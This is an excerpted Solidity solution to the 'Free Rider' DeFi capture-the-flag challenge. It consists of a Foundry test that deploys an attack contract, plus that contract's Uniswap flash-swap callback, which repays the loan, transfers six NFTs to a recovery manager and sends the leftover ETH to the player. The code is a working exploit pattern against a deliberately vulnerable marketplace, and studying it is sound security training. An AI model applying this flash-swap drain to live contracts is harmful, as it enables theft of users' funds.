...
contract FreeRiderChallenge is Test {
    ...
    function test_freeRider() public checkSolvedByPlayer {
        AttackContract exp = new AttackContract(
            weth, token, uniswapV2Factory, uniswapV2Router, uniswapPair, marketplace, nft, recoveryManager
        );
        payable(address(exp)).transfer(player.balance);
        exp.attack(player);
    }
...
contract AttackContract {
    ...
    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        ...
        uint256 fee = ((amount0 + amount1) * 3) / 997 + 1;
        uint256 repayAmount = amount0 + amount1 + fee;
        weth.approve(msg.sender, repayAmount);
        weth.transfer(msg.sender, repayAmount);
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
        }
        weth.withdraw(weth.balanceOf(address(this)));
        payable(abi.decode(data, (address))).transfer(address(this).balance);
    }
